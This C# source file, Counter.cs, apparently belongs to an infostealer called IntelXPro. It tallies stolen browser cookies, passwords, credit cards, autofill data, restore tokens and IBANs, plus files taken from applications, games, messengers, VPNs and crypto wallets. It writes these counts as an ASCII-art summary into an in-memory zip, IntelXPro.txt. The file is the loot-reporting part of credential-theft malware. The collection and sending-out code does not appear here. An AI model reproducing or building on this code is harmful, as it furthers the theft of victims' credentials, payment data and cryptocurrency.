using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Dependencies.Data
{
    internal class Counter
    {
        public class CounterBrowser
        {
            public string Profile;
            public string BrowserName;
            public long Cookies;
            public long Password;
            public long CreditCards;
            public long AutoFill;
            public long RestoreToken;
            public long MaskCreditCard;
            public long MaskedIban;
        }

        public class CounterApplications
        {
            public string Name;
            public ConcurrentBag<string> Files = new ConcurrentBag<string>();
        }

        public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();
        public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();
        public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();
        public ConcurrentBag<CounterBrowser> Browsers = new ConcurrentBag<CounterBrowser>();
        public ConcurrentBag<CounterApplications> Applications = new ConcurrentBag<CounterApplications>();
        public ConcurrentBag<CounterApplications> Vpns = new ConcurrentBag<CounterApplications>();
        public ConcurrentBag<CounterApplications> Games = new ConcurrentBag<CounterApplications>();
        public ConcurrentBag<CounterApplications> Messangers = new ConcurrentBag<CounterApplications>();

        public void Collect(InMemoryZip zip)
        {
            List<string> list = new List<string>();
            list.Add(".___        __         .__  ____  _____________                ");
            list.Add("|   | _____/  |_  ____ |  | \\   \\/  /\\______   \\_______  ____  ");
            list.Add("|   |/    \\   __\\/ __ \\|  |  \\     /  |     ___/\\_  __ \\/  _ \\ ");
            list.Add("|   |   |  \\  | \\  ___/|  |__/     \\  |    |     |  | \\(  <_> )");
            list.Add("|___|___|  /__|  \\___  >____/___/\\  \\ |____|     |__|   \\____/ ");
            list.Add("         \\/          \\/           \\_/                          ");
            list.Add("");

            if (Browsers.Count > 0)
            {
                list.Add(string.Format("[Browsers]  [--{0}--]  [{1}]", Browsers.Count, string.Join(", ", Browsers.Select(b => b.BrowserName).ToArray())));
                foreach (CounterBrowser browser in Browsers)
                {
                    list.Add("  - " + browser.Profile);
                    if (browser.Cookies != 0L)
                        list.Add($"       [Cookies {browser.Cookies}]");
                    if (browser.Password != 0L)
                        list.Add($"       [Passwords {browser.Password}]");
                    if (browser.CreditCards != 0L)
                        list.Add($"       [CreditCards {browser.CreditCards}]");
                    if (browser.AutoFill != 0L)
                        list.Add($"       [AutoFill {browser.AutoFill}]");
                    if (browser.RestoreToken != 0L)
                        list.Add($"       [RestoreToken {browser.RestoreToken}]");
                    if (browser.MaskCreditCard != 0L)
                        list.Add($"       [MaskCreditCard {browser.MaskCreditCard}]");
                    if (browser.MaskedIban != 0L)
                        list.Add($"       [MaskedIban {browser.MaskedIban}]");
                    list.Add("");
                }
                list.Add("");
            }

            if (Applications.Count > 0)
            {
                list.Add(string.Format("[Applications]  [--{0}--]  [{1}]", Applications.Count, string.Join(", ", Applications.Select(b => b.Name).ToArray())));
                foreach (CounterApplications application in Applications)
                {
                    list.Add("     [Name " + application.Name + "]");
                    foreach (string item in application.Files.Reverse())
                    {
                        list.Add("       - " + item);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (Games.Count > 0)
            {
                list.Add(string.Format("[Games]  [--{0}--]  [{1}]", Games.Count, string.Join(", ", Games.Select(b => b.Name).ToArray())));
                foreach (CounterApplications game in Games)
                {
                    list.Add("     [Name " + game.Name + "]");
                    foreach (string item in game.Files.Reverse())
                    {
                        list.Add("       - " + item);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (Messangers.Count > 0)
            {
                list.Add(string.Format("[Messangers]  [--{0}--]  [{1}]", Messangers.Count, string.Join(", ", Messangers.Select(b => b.Name).ToArray())));
                foreach (CounterApplications messanger in Messangers)
                {
                    list.Add("     [Name " + messanger.Name + "]");
                    foreach (string item in messanger.Files.Reverse())
                    {
                        list.Add("       - " + item);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (Vpns.Count > 0)
            {
                list.Add(string.Format("[Vpns]  [--{0}--]  [{1}]", Vpns.Count, string.Join(", ", Vpns.Select(b => b.Name).ToArray())));
                foreach (CounterApplications vpn in Vpns)
                {
                    list.Add("     [Name " + vpn.Name + "]");
                    foreach (string item in vpn.Files.Reverse())
                    {
                        list.Add("       - " + item);
                    }
                    list.Add("");
                }
                list.Add("");
            }

            if (CryptoChromium.Count > 0)
            {
                list.Add($"[CryptoChromium]  [--{CryptoChromium.Count}--]");
                foreach (string item in CryptoChromium)
                {
                    list.Add("  - " + item);
                }
                list.Add("");
            }

            if (CryptoDesktop.Count > 0)
            {
                list.Add($"[CryptoDesktop]  [--{CryptoDesktop.Count}--]");
                foreach (string item in CryptoDesktop)
                {
                    list.Add("  - " + item);
                }
                list.Add("");
            }

            if (FilesGrabber.Count > 0)
            {
                list.Add($"[FilesGrabber]  [--{FilesGrabber.Count}--]");
                
                var filesToShow = FilesGrabber.Take(99);
                foreach (string item in filesToShow)
                {
                    list.Add("  - " + item);
                }
                
                if (FilesGrabber.Count > 99)
                {
                    list.Add("  - ... and " + (FilesGrabber.Count - 99) + " more files");
                }
                
                list.Add("");
            }

            zip.AddTextFile("IntelXPro.txt", string.Join("\n", list));
        }
    }
}